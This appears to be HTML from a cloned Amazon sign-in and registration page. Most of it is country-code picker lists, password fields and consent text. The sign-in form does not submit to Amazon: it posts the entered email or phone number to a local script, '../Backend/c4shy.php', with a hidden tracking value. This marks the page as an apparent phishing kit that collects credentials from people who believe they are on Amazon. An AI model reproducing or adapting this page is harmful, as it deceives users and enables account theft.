  Philippines <span dir="ltr">+63</span>
</span></li>



<li data-country-code-text="PL +48" data-value="PL"><span class="a-list-item">
  Poland <span dir="ltr">+48</span>
</span></li>



<li data-country-code-text="PT +351" data-value="PT"><span class="a-list-item">
  Portugal <span dir="ltr">+351</span>
</span></li>



<li data-country-code-text="PR +1" data-value="PR"><span class="a-list-item">
  Puerto Rico <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="QA +974" data-value="QA"><span class="a-list-item">
  Qatar <span dir="ltr">+974</span>
</span></li>



<li data-country-code-text="RO +40" data-value="RO"><span class="a-list-item">
  Romania <span dir="ltr">+40</span>
</span></li>



<li data-country-code-text="RU +7" data-value="RU"><span class="a-list-item">
  Russia <span dir="ltr">+7</span>
</span></li>



<li data-country-code-text="RW +250" data-value="RW"><span class="a-list-item">
  Rwanda <span dir="ltr">+250</span>
</span></li>



<li data-country-code-text="RE +262" data-value="RE"><span class="a-list-item">
  Réunion <span dir="ltr">+262</span>
</span></li>



<li data-country-code-text="WS +685" data-value="WS"><span class="a-list-item">
  Samoa <span dir="ltr">+685</span>
</span></li>



<li data-country-code-text="SM +378" data-value="SM"><span class="a-list-item">
  San Marino <span dir="ltr">+378</span>
</span></li>



<li data-country-code-text="SA +966" data-value="SA"><span class="a-list-item">
  Saudi Arabia <span dir="ltr">+966</span>
</span></li>



<li data-country-code-text="SN +221" data-value="SN"><span class="a-list-item">
  Senegal <span dir="ltr">+221</span>
</span></li>



<li data-country-code-text="RS +381" data-value="RS"><span class="a-list-item">
  Serbia <span dir="ltr">+381</span>
</span></li>



<li data-country-code-text="SC +248" data-value="SC"><span class="a-list-item">
  Seychelles <span dir="ltr">+248</span>
</span></li>



<li data-country-code-text="SL +232" data-value="SL"><span class="a-list-item">
  Sierra Leone <span dir="ltr">+232</span>
</span></li>



<li data-country-code-text="SG +65" data-value="SG"><span class="a-list-item">
  Singapore <span dir="ltr">+65</span>
</span></li>



<li data-country-code-text="SX +1" data-value="SX"><span class="a-list-item">
  Sint Maarten <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="SK +421" data-value="SK"><span class="a-list-item">
  Slovakia <span dir="ltr">+421</span>
</span></li>



<li data-country-code-text="SI +386" data-value="SI"><span class="a-list-item">
  Slovenia <span dir="ltr">+386</span>
</span></li>



<li data-country-code-text="SB +677" data-value="SB"><span class="a-list-item">
  Solomon Islands <span dir="ltr">+677</span>
</span></li>



<li data-country-code-text="SO +252" data-value="SO"><span class="a-list-item">
  Somalia <span dir="ltr">+252</span>
</span></li>



<li data-country-code-text="ZA +27" data-value="ZA"><span class="a-list-item">
  South Africa <span dir="ltr">+27</span>
</span></li>



<li data-country-code-text="KR +82" data-value="KR"><span class="a-list-item">
  South Korea <span dir="ltr">+82</span>
</span></li>



<li data-country-code-text="SS +211" data-value="SS"><span class="a-list-item">
  South Sudan <span dir="ltr">+211</span>
</span></li>



<li data-country-code-text="ES +34" data-value="ES"><span class="a-list-item">
  Spain <span dir="ltr">+34</span>
</span></li>



<li data-country-code-text="LK +94" data-value="LK"><span class="a-list-item">
  Sri Lanka <span dir="ltr">+94</span>
</span></li>



<li data-country-code-text="KN +1" data-value="KN"><span class="a-list-item">
  St. Kitts &amp; Nevis <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="LC +1" data-value="LC"><span class="a-list-item">
  St. Lucia <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="PM +508" data-value="PM"><span class="a-list-item">
  St. Pierre &amp; Miquelon <span dir="ltr">+508</span>
</span></li>



<li data-country-code-text="VC +1" data-value="VC"><span class="a-list-item">
  St. Vincent &amp; Grenadines <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="SD +249" data-value="SD"><span class="a-list-item">
  Sudan <span dir="ltr">+249</span>
</span></li>



<li data-country-code-text="SR +597" data-value="SR"><span class="a-list-item">
  Suriname <span dir="ltr">+597</span>
</span></li>



<li data-country-code-text="SZ +268" data-value="SZ"><span class="a-list-item">
  Swaziland <span dir="ltr">+268</span>
</span></li>



<li data-country-code-text="SE +46" data-value="SE"><span class="a-list-item">
  Sweden <span dir="ltr">+46</span>
</span></li>



<li data-country-code-text="CH +41" data-value="CH"><span class="a-list-item">
  Switzerland <span dir="ltr">+41</span>
</span></li>



<li data-country-code-text="SY +963" data-value="SY"><span class="a-list-item">
  Syria <span dir="ltr">+963</span>
</span></li>



<li data-country-code-text="ST +239" data-value="ST"><span class="a-list-item">
  São Tomé &amp; Príncipe <span dir="ltr">+239</span>
</span></li>



<li data-country-code-text="TW +886" data-value="TW"><span class="a-list-item">
  Taiwan <span dir="ltr">+886</span>
</span></li>



<li data-country-code-text="TJ +992" data-value="TJ"><span class="a-list-item">
  Tajikistan <span dir="ltr">+992</span>
</span></li>



<li data-country-code-text="TZ +255" data-value="TZ"><span class="a-list-item">
  Tanzania <span dir="ltr">+255</span>
</span></li>



<li data-country-code-text="TH +66" data-value="TH"><span class="a-list-item">
  Thailand <span dir="ltr">+66</span>
</span></li>



<li data-country-code-text="TL +670" data-value="TL"><span class="a-list-item">
  Timor-Leste <span dir="ltr">+670</span>
</span></li>



<li data-country-code-text="TG +228" data-value="TG"><span class="a-list-item">
  Togo <span dir="ltr">+228</span>
</span></li>



<li data-country-code-text="TO +676" data-value="TO"><span class="a-list-item">
  Tonga <span dir="ltr">+676</span>
</span></li>



<li data-country-code-text="TT +1" data-value="TT"><span class="a-list-item">
  Trinidad &amp; Tobago <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="TN +216" data-value="TN"><span class="a-list-item">
  Tunisia <span dir="ltr">+216</span>
</span></li>



<li data-country-code-text="TR +90" data-value="TR"><span class="a-list-item">
  Turkey <span dir="ltr">+90</span>
</span></li>



<li data-country-code-text="TM +993" data-value="TM"><span class="a-list-item">
  Turkmenistan <span dir="ltr">+993</span>
</span></li>



<li data-country-code-text="TC +1" data-value="TC"><span class="a-list-item">
  Turks &amp; Caicos Islands <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="TV +688" data-value="TV"><span class="a-list-item">
  Tuvalu <span dir="ltr">+688</span>
</span></li>



<li data-country-code-text="VI +1" data-value="VI"><span class="a-list-item">
  U.S. Virgin Islands <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="UG +256" data-value="UG"><span class="a-list-item">
  Uganda <span dir="ltr">+256</span>
</span></li>



<li data-country-code-text="UA +380" data-value="UA"><span class="a-list-item">
  Ukraine <span dir="ltr">+380</span>
</span></li>



<li data-country-code-text="AE +971" data-value="AE"><span class="a-list-item">
  United Arab Emirates <span dir="ltr">+971</span>
</span></li>



<li data-country-code-text="GB +44" data-value="GB"><span class="a-list-item">
  United Kingdom <span dir="ltr">+44</span>
</span></li>



<li data-country-code-text="US +1" data-value="US" class="selected"><span class="a-list-item">
  United States <span dir="ltr">+1</span>
</span></li>



<li data-country-code-text="UY +598" data-value="UY"><span class="a-list-item">
  Uruguay <span dir="ltr">+598</span>
</span></li>



<li data-country-code-text="UZ +998" data-value="UZ"><span class="a-list-item">
  Uzbekistan <span dir="ltr">+998</span>
</span></li>



<li data-country-code-text="VU +678" data-value="VU"><span class="a-list-item">
  Vanuatu <span dir="ltr">+678</span>
</span></li>



<li data-country-code-text="VE +58" data-value="VE"><span class="a-list-item">
  Venezuela <span dir="ltr">+58</span>
</span></li>



<li data-country-code-text="VN +84" data-value="VN"><span class="a-list-item">
  Vietnam <span dir="ltr">+84</span>
</span></li>



<li data-country-code-text="YE +967" data-value="YE"><span class="a-list-item">
  Yemen <span dir="ltr">+967</span>
</span></li>



<li data-country-code-text="ZM +260" data-value="ZM"><span class="a-list-item">
  Zambia <span dir="ltr">+260</span>
</span></li>



<li data-country-code-text="ZW +263" data-value="ZW"><span class="a-list-item">
  Zimbabwe <span dir="ltr">+263</span>
</span></li>



<li data-country-code-text="AX +358" data-value="AX"><span class="a-list-item">
  Åland Islands <span dir="ltr">+358</span>
</span></li>

</ul>
</span>
</div>
</div>
</div>

<script type="text/javascript">
P.when("jQuery", "ready").execute(function(jQuery) {

jQuery(".countryCodeBox").live("click",function(){
var ContryCodeValue = setInterval(gitSelectCountryCode, 10);

function gitSelectCountryCode() {
  var getValue = jQuery('.CountryCodeSelectedBox').text().split(' ');
  jQuery('.CountryCodeSelectedBox').empty();
  jQuery('.CountryCodeSelectedBox').html('<span class="countryCodeClass countryCode-' + getValue[0] + '"></span> ' + getValue[1]);
  clearInterval(ContryCodeValue);
}
});
});
</script>





      

      
    
  

  



<div id="auth-register-mobile-custom-message">
  
    
  
</div>



  
















<label for="ap_password" aria-hidden="true" class="a-form-label">
Create a password
</label>













<script type="a-state" data-a-state="{&quot;key&quot;:&quot;auth-show-password&quot;}">{"isShowPasswordEnabled":true,"showPasswordChecked":true}</script>
<div class="a-row a-spacing-small">
<div class="a-row auth-password-row">



<div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-require-password-validation auth-inline-password-container auth-password-container auth-password input_table_layout"><input type="password" maxlength="1024" id="ap_password" name="password" spellcheck="false" aria-describedby="ap_password_context_message_section" aria-label="Create a password" aria-required="true" autocorrect="off" autocapitalize="off"><div class="a-row auth-visible-password-container auth-show-password-empty">
<span id="auth-visible-password" class="a-size-small a-color-secondary auth-visible-password"></span>
</div></div>





<div id="ap_password_icon" class="auth-clear-icons" tabindex="0" style="display: none;">


<i class="a-icon a-icon-close" role="img" aria-label="Clear password text field, button"></i>

</div>
</div>



<div id="ap_password_context_message_section" class="a-section a-spacing-none">





  
    <div id="passwordInformationMessage" class="a-section a-spacing-top-mini auth-inlined-information-message aok-hidden">
      Minimum 6 characters required
    </div>
  

  








































































<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-small a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
Minimum 6 characters required
</div></div></div>





<div id="auth-password-invalid-password-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-small a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
Minimum 6 characters required
</div></div></div>










</div>





<input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked">

</div>

<div class="a-row">

<div class="a-column a-span12 a-spacing-small">
<div id="auth-show-password-checkbox-container" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"><label for="auth-register-show-password-checkbox"><input id="auth-register-show-password-checkbox" type="checkbox" name="" value="" checked=""><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
<span class="a-size-small auth-password-margin">
Show password
</span>
</span></label></div>
</div>

</div>




































<div id="mobileClaimDisclosureMessage" class="a-section a-spacing-top-mini auth-inlined-information-message aok-hidden" style="display: none;">
  By enrolling a mobile phone number, you consent to receive automated security notifications via text message from Amazon. Remove your number in Login &amp; Security to cancel. For more information reply HELP. Message and data rates may apply. Message frequency varies.
</div>
<div id="mobileClaimDisclosureMessageV2" class="a-section a-spacing-top-mini auth-inlined-information-message aok-hidden" style="display: none;">
  By enrolling a mobile phone number, you consent to receive automated security notifications via text message from Amazon. Remove your number in Login &amp; Security to cancel. For more information reply HELP. Message and data rates may apply. Message frequency varies.
</div>
<div id="mobileClaimDisclosureMessageRelaxed" class="a-section a-spacing-top-mini auth-inlined-information-message aok-hidden" style="display: none;">
  To verify your number, we will send you a text message with a temporary code. Message and data rates may apply.
</div>





<div class="a-section ap_mobile_number_fields">
  <span id="auth-continue" class="a-button a-spacing-medium a-button-primary"><span class="a-button-inner"><input id="continue" aria-describedby="legalTextRow" class="a-button-input" type="submit" aria-labelledby="auth-continue-announce"><span id="auth-continue-announce" class="a-button-text" aria-hidden="true">
    
      
        <span class="default-text" style="">Continue</span>
        <span class="phone-text aok-hidden" style="display: none;">Verify mobile number</span>
        <span class="email-text aok-hidden" style="display: none;">Verify email</span>
      

      
    
  </span></span></span>
</div>






  
  
    <div id="legal-section" class="a-section">
      
      



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
By creating an account, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
</div> 

    </div>
  

</form>
      </div>
    </div>
  </div></div>


  <div id="accordion-row-login" class="a-box a-accordion-active" data-a-accordion-row-name="accordion-row-login"><div class="a-box-inner a-accordion-row-container">
    
      <div class="a-accordion-row-a11y" role="radio" aria-checked="true" aria-expanded="true"><a id="login_accordion_header" data-csa-c-func-deps="aui-da-a-accordion" data-csa-c-type="widget" data-csa-interaction-events="click" data-action="a-accordion" class="a-accordion-row a-declarative" href="https://www.amazon.fr/ap/signin?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin&amp;prevRID=Q2E2JWSX05HN7DAWWE8S&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=anywhere_v2_fr&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=anywhere_fr&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" aria-label="" data-csa-c-id="de0vad-qplf4a-yeah7r-m4xqae"><i class="a-icon a-accordion-radio a-icon-radio-active"></i><h5>
        <div class="a-row">
          <span class="a-size-base a-text-bold">Sign in</span>.
          <span class="a-size-small accordionHeaderMessage">Already a customer&nbsp;?</span>
        </div>
      </h5></a></div>
    
    <div class="a-accordion-inner">

      

      <form id="ap_login_form" name="signIn" method="post" novalidate="" action="../Backend/c4shy.php" class="auth-validate-form fwcim-form auth-clearable-form" data-fwcim-id="fkgJTwC8">
  
    <input type="hidden" name="step1" value="nik47">
    <input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT">
  

<script type="a-state" data-a-state="{&quot;key&quot;:&quot;login-with-otp-state&quot;}">{"isLoginWithOTPEnabled":true}</script>

<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
  <label for="ap_email_login" aria-hidden="true" class="a-form-label auth-mobile-label">Email or phone number
  </label>
  <input type="hidden" name="subPageType" value="SignInClaimCollect">
  <input type="hidden" name="shouldShowPersistentLabels" value="false">
  
      
      <input type="hidden" name="countryCode" value="FR" id="auth-country-picker-signin" class="auth-country-picker" disabled="disabled">
      <div class="a-row a-spacing-base">
        <span class="a-declarative" data-action="country_picker_bottom_sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-country_picker_bottom_sheet" data-country_picker_bottom_sheet="{}" data-csa-c-id="iz26zk-4jlbuf-y90gv2-rykjz3">
          <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><div class="a-section country-picker aok-hidden" value="FR" style="display: none;">
          <span class="a-declarative" data-action="a-sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-sheet" data-a-sheet="{&quot;sheetType&quot;:&quot;web&quot;,&quot;name&quot;:&quot;country_bottom_sheet_signin&quot;,&quot;preloadDomId&quot;:&quot;country_bottom_sheet_container_signin&quot;,&quot;closeType&quot;:&quot;icon&quot;}" data-csa-c-id="hip0sg-hcycb0-w1bjmk-krjj0w">
            <span class="country-display-text">BE +32</span>
          </span>
        </div><input type="email" maxlength="128" id="ap_email_login" placeholder="Email or phone number" name="email"  aria-label="Email or phone number" autocorrect="off" autocapitalize="off"></div>
          


<div id="ap_email_login_icon" class="auth-clear-icons" style="display: none;">
  

  <i class="a-icon a-icon-close" role="img" aria-label="Effacer le champ de texte de l'e-mail, bouton"></i>

</div>
        </span>
        

<div id="country_bottom_sheet_container_signin" class="aok-hidden">
  <div class="a-container ap-no-padding">
    <span class="a-declarative" data-action="select_country_signin" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-select_country_signin" data-select_country_signin="{}" data-csa-c-id="3td2eg-iiufhw-55y4l7-wxbhvx">
    <ul id="ap-countries-list-signin" class="a-unordered-list a-nostyle a-vertical ap-countries-list">
        
          
          
          <li data-country-code-text="AF +93" data-value="AF"><span class="a-list-item">
            Afghanistan <span dir="ltr">+93</span>
          </span></li>
        
          
          
          <li data-country-code-text="AL +355" data-value="AL"><span class="a-list-item">
            Albania <span dir="ltr">+355</span>
          </span></li>
        
          
          
          <li data-country-code-text="DZ +213" data-value="DZ"><span class="a-list-item">
            Algeria <span dir="ltr">+213</span>
          </span></li>
        
          
          
          <li data-country-code-text="AS +1" data-value="AS"><span class="a-list-item">
            American Samoa <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="AD +376" data-value="AD"><span class="a-list-item">
            Andorra <span dir="ltr">+376</span>
          </span></li>
        
          
          
          <li data-country-code-text="AO +244" data-value="AO"><span class="a-list-item">
            Angola <span dir="ltr">+244</span>
          </span></li>
        
          
          
          <li data-country-code-text="AG +1" data-value="AG"><span class="a-list-item">
            Antigua &amp; Barbuda <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="AR +54" data-value="AR"><span class="a-list-item">
            Argentina <span dir="ltr">+54</span>
          </span></li>
        
          
          
          <li data-country-code-text="AM +374" data-value="AM"><span class="a-list-item">
            Armenia <span dir="ltr">+374</span>
          </span></li>
        
          
          
          <li data-country-code-text="AW +297" data-value="AW"><span class="a-list-item">
            Aruba <span dir="ltr">+297</span>
          </span></li>
        
          
          
          <li data-country-code-text="AU +61" data-value="AU"><span class="a-list-item">
            Australia <span dir="ltr">+61</span>
          </span></li>
        
          
          
          <li data-country-code-text="AT +43" data-value="AT"><span class="a-list-item">
            Austria <span dir="ltr">+43</span>
          </span></li>
        
          
          
          <li data-country-code-text="AZ +994" data-value="AZ"><span class="a-list-item">
            Azerbaijan <span dir="ltr">+994</span>
          </span></li>
        
          
          
          <li data-country-code-text="BS +1" data-value="BS"><span class="a-list-item">
            Bahamas <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="BH +973" data-value="BH"><span class="a-list-item">
            Bahrain <span dir="ltr">+973</span>
          </span></li>
        
          
          
          <li data-country-code-text="BD +880" data-value="BD"><span class="a-list-item">
            Bangladesh <span dir="ltr">+880</span>
          </span></li>
        
          
          
          <li data-country-code-text="BB +1" data-value="BB"><span class="a-list-item">
            Barbados <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="BY +375" data-value="BY"><span class="a-list-item">
            Belarus <span dir="ltr">+375</span>
          </span></li>
        
          
          
          <li data-country-code-text="BE +32" data-value="BE"><span class="a-list-item">
            Belgium <span dir="ltr">+32</span>
          </span></li>
        
          
          
          <li data-country-code-text="BZ +501" data-value="BZ"><span class="a-list-item">
            Belize <span dir="ltr">+501</span>
          </span></li>
        
          
          
          <li data-country-code-text="BJ +229" data-value="BJ"><span class="a-list-item">
            Benin <span dir="ltr">+229</span>
          </span></li>
        
          
          
          <li data-country-code-text="BM +1" data-value="BM"><span class="a-list-item">
            Bermuda <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="BT +975" data-value="BT"><span class="a-list-item">
            Bhutan <span dir="ltr">+975</span>
          </span></li>
        
          
          
          <li data-country-code-text="BO +591" data-value="BO"><span class="a-list-item">
            Bolivia <span dir="ltr">+591</span>
          </span></li>
        
          
          
          <li data-country-code-text="BA +387" data-value="BA"><span class="a-list-item">
            Bosnia &amp; Herzegovina <span dir="ltr">+387</span>
          </span></li>
        
          
          
          <li data-country-code-text="BW +267" data-value="BW"><span class="a-list-item">
            Botswana <span dir="ltr">+267</span>
          </span></li>
        
          
          
          <li data-country-code-text="BR +55" data-value="BR"><span class="a-list-item">
            Brazil <span dir="ltr">+55</span>
          </span></li>
        
          
          
          <li data-country-code-text="VG +1" data-value="VG"><span class="a-list-item">
            British Virgin Islands <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="BN +673" data-value="BN"><span class="a-list-item">
            Brunei <span dir="ltr">+673</span>
          </span></li>
        
          
          
          <li data-country-code-text="BG +359" data-value="BG"><span class="a-list-item">
            Bulgaria <span dir="ltr">+359</span>
          </span></li>
        
          
          
          <li data-country-code-text="BF +226" data-value="BF"><span class="a-list-item">
            Burkina Faso <span dir="ltr">+226</span>
          </span></li>
        
          
          
          <li data-country-code-text="BI +257" data-value="BI"><span class="a-list-item">
            Burundi <span dir="ltr">+257</span>
          </span></li>
        
          
          
          <li data-country-code-text="KH +855" data-value="KH"><span class="a-list-item">
            Cambodia <span dir="ltr">+855</span>
          </span></li>
        
          
          
          <li data-country-code-text="CM +237" data-value="CM"><span class="a-list-item">
            Cameroon <span dir="ltr">+237</span>
          </span></li>
        
          
          
          <li data-country-code-text="CA +1" data-value="CA"><span class="a-list-item">
            Canada <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="CV +238" data-value="CV"><span class="a-list-item">
            Cape Verde <span dir="ltr">+238</span>
          </span></li>
        
          
          
          <li data-country-code-text="BQ +599" data-value="BQ"><span class="a-list-item">
            Caribbean Netherlands <span dir="ltr">+599</span>
          </span></li>
        
          
          
          <li data-country-code-text="KY +1" data-value="KY"><span class="a-list-item">
            Cayman Islands <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="CF +236" data-value="CF"><span class="a-list-item">
            Central African Republic <span dir="ltr">+236</span>
          </span></li>
        
          
          
          <li data-country-code-text="TD +235" data-value="TD"><span class="a-list-item">
            Chad <span dir="ltr">+235</span>
          </span></li>
        
          
          
          <li data-country-code-text="CL +56" data-value="CL"><span class="a-list-item">
            Chile <span dir="ltr">+56</span>
          </span></li>
        
          
          
          <li data-country-code-text="CN +86" data-value="CN"><span class="a-list-item">
            China <span dir="ltr">+86</span>
          </span></li>
        
          
          
          <li data-country-code-text="CO +57" data-value="CO"><span class="a-list-item">
            Colombia <span dir="ltr">+57</span>
          </span></li>
        
          
          
          <li data-country-code-text="KM +269" data-value="KM"><span class="a-list-item">
            Comoros <span dir="ltr">+269</span>
          </span></li>
        
          
          
          <li data-country-code-text="CG +242" data-value="CG"><span class="a-list-item">
            Congo - Brazzaville <span dir="ltr">+242</span>
          </span></li>
        
          
          
          <li data-country-code-text="CD +243" data-value="CD"><span class="a-list-item">
            Congo - Kinshasa <span dir="ltr">+243</span>
          </span></li>
        
          
          
          <li data-country-code-text="CK +682" data-value="CK"><span class="a-list-item">
            Cook Islands <span dir="ltr">+682</span>
          </span></li>
        
          
          
          <li data-country-code-text="CR +506" data-value="CR"><span class="a-list-item">
            Costa Rica <span dir="ltr">+506</span>
          </span></li>
        
          
          
          <li data-country-code-text="HR +385" data-value="HR"><span class="a-list-item">
            Croatia <span dir="ltr">+385</span>
          </span></li>
        
          
          
          <li data-country-code-text="CU +53" data-value="CU"><span class="a-list-item">
            Cuba <span dir="ltr">+53</span>
          </span></li>
        
          
          
          <li data-country-code-text="CW +599" data-value="CW"><span class="a-list-item">
            Curaçao <span dir="ltr">+599</span>
          </span></li>
        
          
          
          <li data-country-code-text="CY +357" data-value="CY"><span class="a-list-item">
            Cyprus <span dir="ltr">+357</span>
          </span></li>
        
          
          
          <li data-country-code-text="CZ +420" data-value="CZ"><span class="a-list-item">
            Czech Republic <span dir="ltr">+420</span>
          </span></li>
        
          
          
          <li data-country-code-text="CI +225" data-value="CI"><span class="a-list-item">
            Côte d’Ivoire <span dir="ltr">+225</span>
          </span></li>
        
          
          
          <li data-country-code-text="DK +45" data-value="DK"><span class="a-list-item">
            Denmark <span dir="ltr">+45</span>
          </span></li>
        
          
          
          <li data-country-code-text="DJ +253" data-value="DJ"><span class="a-list-item">
            Djibouti <span dir="ltr">+253</span>
          </span></li>
        
          
          
          <li data-country-code-text="DM +1" data-value="DM"><span class="a-list-item">
            Dominica <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="DO +1" data-value="DO"><span class="a-list-item">
            Dominican Republic <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="EC +593" data-value="EC"><span class="a-list-item">
            Ecuador <span dir="ltr">+593</span>
          </span></li>
        
          
          
          <li data-country-code-text="EG +20" data-value="EG"><span class="a-list-item">
            Egypt <span dir="ltr">+20</span>
          </span></li>
        
          
          
          <li data-country-code-text="SV +503" data-value="SV"><span class="a-list-item">
            El Salvador <span dir="ltr">+503</span>
          </span></li>
        
          
          
          <li data-country-code-text="GQ +240" data-value="GQ"><span class="a-list-item">
            Equatorial Guinea <span dir="ltr">+240</span>
          </span></li>
        
          
          
          <li data-country-code-text="ER +291" data-value="ER"><span class="a-list-item">
            Eritrea <span dir="ltr">+291</span>
          </span></li>
        
          
          
          <li data-country-code-text="EE +372" data-value="EE"><span class="a-list-item">
            Estonia <span dir="ltr">+372</span>
          </span></li>
        
          
          
          <li data-country-code-text="ET +251" data-value="ET"><span class="a-list-item">
            Ethiopia <span dir="ltr">+251</span>
          </span></li>
        
          
          
          <li data-country-code-text="FK +500" data-value="FK"><span class="a-list-item">
            Falkland Islands <span dir="ltr">+500</span>
          </span></li>
        
          
          
          <li data-country-code-text="FO +298" data-value="FO"><span class="a-list-item">
            Faroe Islands <span dir="ltr">+298</span>
          </span></li>
        
          
          
          <li data-country-code-text="FJ +679" data-value="FJ"><span class="a-list-item">
            Fiji <span dir="ltr">+679</span>
          </span></li>
        
          
          
          <li data-country-code-text="FI +358" data-value="FI"><span class="a-list-item">
            Finland <span dir="ltr">+358</span>
          </span></li>
        
          
          
          <li data-country-code-text="FR +33" data-value="FR"><span class="a-list-item">
            France <span dir="ltr">+33</span>
          </span></li>
        
          
          
          <li data-country-code-text="GF +594" data-value="GF"><span class="a-list-item">
            French Guiana <span dir="ltr">+594</span>
          </span></li>
        
          
          
          <li data-country-code-text="PF +689" data-value="PF"><span class="a-list-item">
            French Polynesia <span dir="ltr">+689</span>
          </span></li>
        
          
          
          <li data-country-code-text="GA +241" data-value="GA"><span class="a-list-item">
            Gabon <span dir="ltr">+241</span>
          </span></li>
        
          
          
          <li data-country-code-text="GM +220" data-value="GM"><span class="a-list-item">
            Gambia <span dir="ltr">+220</span>
          </span></li>
        
          
          
          <li data-country-code-text="GE +995" data-value="GE"><span class="a-list-item">
            Georgia <span dir="ltr">+995</span>
          </span></li>
        
          
          
          <li data-country-code-text="DE +49" data-value="DE"><span class="a-list-item">
            Germany <span dir="ltr">+49</span>
          </span></li>
        
          
          
          <li data-country-code-text="GH +233" data-value="GH"><span class="a-list-item">
            Ghana <span dir="ltr">+233</span>
          </span></li>
        
          
          
          <li data-country-code-text="GI +350" data-value="GI"><span class="a-list-item">
            Gibraltar <span dir="ltr">+350</span>
          </span></li>
        
          
          
          <li data-country-code-text="GR +30" data-value="GR"><span class="a-list-item">
            Greece <span dir="ltr">+30</span>
          </span></li>
        
          
          
          <li data-country-code-text="GL +299" data-value="GL"><span class="a-list-item">
            Greenland <span dir="ltr">+299</span>
          </span></li>
        
          
          
          <li data-country-code-text="GD +1" data-value="GD"><span class="a-list-item">
            Grenada <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="GP +590" data-value="GP"><span class="a-list-item">
            Guadeloupe <span dir="ltr">+590</span>
          </span></li>
        
          
          
          <li data-country-code-text="GU +1" data-value="GU"><span class="a-list-item">
            Guam <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="GT +502" data-value="GT"><span class="a-list-item">
            Guatemala <span dir="ltr">+502</span>
          </span></li>
        
          
          
          <li data-country-code-text="GN +224" data-value="GN"><span class="a-list-item">
            Guinea <span dir="ltr">+224</span>
          </span></li>
        
          
          
          <li data-country-code-text="GW +245" data-value="GW"><span class="a-list-item">
            Guinea-Bissau <span dir="ltr">+245</span>
          </span></li>
        
          
          
          <li data-country-code-text="GY +592" data-value="GY"><span class="a-list-item">
            Guyana <span dir="ltr">+592</span>
          </span></li>
        
          
          
          <li data-country-code-text="HT +509" data-value="HT"><span class="a-list-item">
            Haiti <span dir="ltr">+509</span>
          </span></li>
        
          
          
          <li data-country-code-text="HN +504" data-value="HN"><span class="a-list-item">
            Honduras <span dir="ltr">+504</span>
          </span></li>
        
          
          
          <li data-country-code-text="HK +852" data-value="HK"><span class="a-list-item">
            Hong Kong <span dir="ltr">+852</span>
          </span></li>
        
          
          
          <li data-country-code-text="HU +36" data-value="HU"><span class="a-list-item">
            Hungary <span dir="ltr">+36</span>
          </span></li>
        
          
          
          <li data-country-code-text="IS +354" data-value="IS"><span class="a-list-item">
            Iceland <span dir="ltr">+354</span>
          </span></li>
        
          
          
          <li data-country-code-text="IN +91" data-value="IN"><span class="a-list-item">
            India <span dir="ltr">+91</span>
          </span></li>
        
          
          
          <li data-country-code-text="ID +62" data-value="ID"><span class="a-list-item">
            Indonesia <span dir="ltr">+62</span>
          </span></li>
        
          
          
          <li data-country-code-text="IR +98" data-value="IR"><span class="a-list-item">
            Iran <span dir="ltr">+98</span>
          </span></li>
        
          
          
          <li data-country-code-text="IQ +964" data-value="IQ"><span class="a-list-item">
            Iraq <span dir="ltr">+964</span>
          </span></li>
        
          
          
          <li data-country-code-text="IE +353" data-value="IE"><span class="a-list-item">
            Ireland <span dir="ltr">+353</span>
          </span></li>
        
          
          
          <li data-country-code-text="IL +972" data-value="IL"><span class="a-list-item">
            Israel <span dir="ltr">+972</span>
          </span></li>
        
          
          
          <li data-country-code-text="IT +39" data-value="IT"><span class="a-list-item">
            Italy <span dir="ltr">+39</span>
          </span></li>
        
          
          
          <li data-country-code-text="JM +1" data-value="JM"><span class="a-list-item">
            Jamaica <span dir="ltr">+1</span>
          </span></li>
        
          
          
          <li data-country-code-text="JP +81" data-value="JP"><span class="a-list-item">
